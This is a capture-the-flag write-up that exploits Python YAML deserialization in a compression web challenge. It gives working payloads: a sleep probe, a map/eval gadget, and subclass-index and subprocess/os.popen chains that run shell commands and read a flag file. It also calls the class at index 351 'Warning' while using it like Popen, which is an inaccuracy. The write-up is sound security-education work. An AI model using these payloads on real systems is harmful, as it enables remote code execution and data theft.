## About the Challenge

This is a **blind web challenge**. We are allowed to input JSON data, which will be compressed and returned to us. We can then decompress the data to view our original input.

![compressor](/static/writeups/photos/compressor1.png)
![compressor](/static/writeups/photos/compressor2.png)

## Solve Process

There's no admin bot, so the flag is likely stored in the backend. This means the challenge is likely an **RCE challenge** or an **LFI challenge**.

We can start investigating by inspecting the compress and decompress endpoints. Sending a request to the **`/convert_to_yaml`** endpoint which compresses our data returns the following:

```json
{"zlib_yaml":"eJwrSS0usVIoAZJcABkdA+U="}
```

**Zlib** is a type of compression algorithm. We can verify this by using [CyberChef](https://gchq.github.io/CyberChef/). Using the **zlib decompress function** confirms that it decompresses back to our original data. Since the data is in **base64 format**, we must decode the base64 data before decompressing it:

![compressor](/static/writeups/photos/compressor3.png)

From the endpoint name (**`/convert_to_yaml`**), we deduce that this is **YAML format**. YAML is a data serialization language. Serialization often comes with vulnerabilities, one of which is the [YAML deserialization attack](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization).

## Testing for YAML Deserialization

To test if the application is vulnerable, we create a script to compress YAML payloads using zlib and encode them in base64:

```python
import zlib, base64
hack = """!!python/object/apply:time.sleep [2]"""
compressed_yaml = zlib.compress(hack.encode())
base64_yaml = base64.b64encode(compressed_yaml).decode()
print(base64_yaml)
```

The payload **`!!python/object/apply:time.sleep [2]`** makes the application sleep for 2 seconds. Sending the following JSON data to the **`/convert_to_json`** endpoint should result in a ~2-second delay if vulnerable:

```json
{
    "zlib_yaml":"eJxTVCyoLMnIz9PPT8pKTS7RTywoyKm0KsnMTdUrzklNLVCINooFAPOLDRo="
}
```

This works, indicating the application is vulnerable to **YAML deserialization**.

## Exploiting the YAML Deserialization

### Initial Payload Testing

We first attempt the payload suggested by **HackTricks**:

```yaml
!!python/object/new:str
state: !!python/tuple
- 'print("test")'
- !!python/object/new:Warning
  state:
    update: !!python/name:exec
```

This results in an error:

```json
{"error":"'Warning' object has no attribute 'items'"}
```

The error suggests that the **`items()`** method is being called during JSONification, and since **`Warning`** objects lack this method, an error is thrown.

### Constructing a Valid Payload

To ensure the payload can be JSONified, we use this:

```yaml
!!python/object/new:tuple 
- !!python/object/new:map 
  - !!python/name:eval
  - [ "123" ]
```

This translates to the following Python code:

```python
tuple(map(eval, ["123"]))
```

**`map(eval, ["123"])`** executes `eval` on each element of the list, allowing arbitrary Python code execution.

### Exploring the Backend

#### Step 1: Get Subclasses

We first list all subclasses of the base class and convert the result to a string for JSON compatibility:

```yaml
!!python/object/new:tuple 
- !!python/object/new:map 
  - !!python/name:eval
  - [ "str(().__class__.__base__.__subclasses__())" ]
```

Searching through the output reveals the **Warning** class at index **351**.

#### Step 2: Import `os` and Execute Commands

We use the index to import **`os`** and execute commands. First, list the files to locate the flag:

```yaml
!!python/object/new:tuple 
- !!python/object/new:map 
  - !!python/name:eval
  - [ "str(().__class__.__base__.__subclasses__()[351]('ls',shell=True,stdout=-1).communicate())" ]
```

Output:

```json
(b'Dockerfile\napp.py\ndocker-compose.yml\nindex.htm\nrequirements.txt\nsecretflag.txt\n', None)
```

The flag file is **`secretflag.txt`**. Read the flag:

```yaml
!!python/object/new:tuple 
- !!python/object/new:map 
  - !!python/name:eval
  - [ "str(().__class__.__base__.__subclasses__()[351]('cat secretflag.txt',shell=True,stdout=-1).communicate())" ]
```

## Flag

```text
blahaj{Y4mL_n0T_S3cUre}
```

## Resources

- [HackTricks YAML Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [YAML Specification](https://yaml.org/spec/)

## Afterword

This approach might not be optimal. The author's intended solution uses a cleaner payload:

```yaml
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - python3
  - -c
  - "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('[SOME CODE]')[0])))"
```

Directly using **`__import__`** for module imports is more efficient. My approach relied on SSTI-like methods because I wasn't aware of **`__import__`**. Additionally, the reason for compressing and encoding the code is unclear.

A cleaner payload:

```yaml
!!python/object/new:tuple 
- !!python/object/new:map 
  - !!python/name:eval
  - [ "str(__import__('os').popen('[SHELL COMMAND]').read())" ]
```